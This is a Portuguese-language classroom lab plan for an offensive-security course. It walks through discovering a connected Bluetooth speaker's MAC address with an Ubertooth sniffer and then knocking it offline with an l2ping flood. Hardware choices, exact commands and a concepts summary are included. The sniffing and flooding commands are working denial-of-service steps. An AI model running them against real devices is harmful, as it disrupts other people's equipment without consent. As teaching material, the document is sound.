# Planejamento de Laboratório: Bluetooth Offensive Security

**Disciplina:** Segurança da Informação / Offensive Security
**Tema:** Negação de Serviço (DoS) e Sniffing em Bluetooth
**Objetivo:** Demonstrar limitações de hardware e vulnerabilidades do protocolo FHSS.

---

## 1. Aquisição de Equipamentos (Hardware)

### Estação de Reconhecimento (Sniffing - Camada 1)
*Objetivo: Descobrir dispositivos ocultos/conectados.*
- **Principal:** `Great Scott Gadgets Ubertooth One`
    - **Função:** Interceptação de pacotes (Sniffer SDR) e descoberta de MAC em conexões ativas.
- **Alternativa Econômica:** `Raspberry Pi 3B+` ou `4`
    - **Requisito:** Instalar Kali Linux ARM + Patch *InternalBlue/Nexmon*.

### Estação de Ataque (Flooding - Camada 2)
*Objetivo: Executar a negação de serviço.*
- **Principal:** `SENA Parani UD100-G03`
    - **Diferencial:** Chipset CSR estável, antena externa, alto alcance (até 300m).
- **Alternativa Econômica:** `Dongle USB Genérico` (Chipset Actions/CSR 4.0)
    - **Limitação:** Curto alcance (~5m) e possíveis travamentos de firmware.

---

## 2. Roteiro de Tarefas (Laboratório Prático)

### Preparação do Ambiente
- [ ] Conectar os dongles (Sniffer e Atacante) nas portas USB.
- [ ] Configurar **USB Passthrough** no VMware Fusion (conectar ao Kali).
- [ ] Verificar reconhecimento dos dispositivos no terminal:
  ```bash
  lsusb
  hciconfig -a

### Fase 1: Reconhecimento Passivo (Intelligence)

- [ ] **Cenário:** Caixa de som conectada ao celular do professor (tocando música).
    
- [ ] Iniciar monitoramento de espectro com Ubertooth:
    
    Bash
    
    ```
    ubertooth-btle -f
    # ou
    ubertooth-rx
    ```
    
- [ ] Identificar e anotar o **MAC Address** (`BD_ADDR`) do alvo oculto.
    

### Fase 2: Configuração do Alvo

- [ ] Parar o Sniffer.
    
- [ ] Ativar a interface do dongle de ataque (`hci0`):
    
    Bash
    
    ```
    sudo hciconfig hci0 up
    ```
    
- [ ] Confirmar que o alvo **não** aparece no scan padrão (prova de conceito de ocultação):
    
    Bash
    
    ```
    sudo hcitool scan
    # Deve retornar vazio se o dispositivo estiver conectado
    ```
    

### Fase 3: Execução do Ataque (DoS)

- [ ] Iniciar o flood de pacotes L2CAP direcionado:
    
    Bash
    
    ```
    sudo l2ping -i hci0 -s 600 -f <MAC_DESCOBERTO>
    ```
    
- [ ] **Validação:** Verificar corte imediato do áudio e desconexão.
    

### Fase 4: Análise Pós-Ataque

- [ ] Interromper o ataque (`Ctrl + C`).
    
- [ ] Resetar a interface Bluetooth caso tenha travado:
    
    Bash
    
    ```
    sudo hciconfig hci0 reset
    ```
    

---

## 3. Conceitos Aprendidos

- **Hardware Limitations:** Diferença entre adaptadores HCI (Camada 2 - Cegos para conexões ativas) e Sniffers SDR (Camada 1 - Visão total do espectro).
    
- **FHSS (Frequency Hopping):** Como o salto de frequência protege contra interferência aleatória, mas falha contra ataques direcionados quando o atacante possui o MAC Address ("a semente do salto").
    
- **Security by Obscurity:** Demonstração de que o modo "Não-Descobrível" (Non-discoverable) não protege contra sniffers passivos.
    
- **Resource Exhaustion:** O DoS ocorre por sobrecarga de processamento de pacotes de controle (LMP/L2CAP), e não por jamming de sinal RF (ruído).
    

---

**Tags:** #security #bluetooth #pentest #aula #kali